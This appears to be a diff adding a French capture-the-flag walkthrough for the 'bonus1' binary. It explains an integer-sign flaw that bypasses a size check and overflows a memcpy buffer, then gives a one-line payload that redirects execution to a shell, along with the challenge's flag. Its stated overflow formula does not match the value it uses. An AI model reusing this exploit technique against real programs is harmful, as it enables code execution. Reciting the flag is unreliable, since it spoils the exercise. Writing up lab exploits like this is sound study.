@@ -1,0 +1,25 @@
+# Walkthrough — bonus1
+
+## 1) Contexte & objectifs
+- Objectif : contourner la vérification et déclencher `execl("/bin/sh", ...)`.
+- Fichier / binaire : `bonus1`.
+- Contexte : `memcpy` copie `local_14 * 4` octets dans un buffer de 40.
+
+## 2) Analyse & vulnérabilité
+- Analyse statique :
+	- Le programme prend un int (`local_14`) et une chaîne.
+	- Si `local_14 < 10`, il copie `local_14 * 4` octets dans `local_3c[40]`.
+	- Si `local_14 == 0x574f4c46`, `execl` est appelé.
+- Analyse dynamique :
+	- Un int négatif est casté en `size_t` dans `memcpy`.
+- Vulnérabilité : overflow du buffer via un `local_14` négatif.
+
+## 3) Exploitation & flag
+- Étapes :
+	- Utiliser un int négatif pour provoquer un gros `memcpy`.
+	- Padding nécessaire pour atteindre l’EIP : `56` octets.
+	- Calcul : `INT_MAX - (56 + 4 / 4) = -2147483633`.
+	- Construire l’argument 2 : `"A" * 56 + adresse de execl`.
+- Commandes utilisées :
+	- `./bonus1 -2147483633 $(python -c 'print("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + "\x82\x84\x04\x08")')`.
+- Flag : `579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245`.
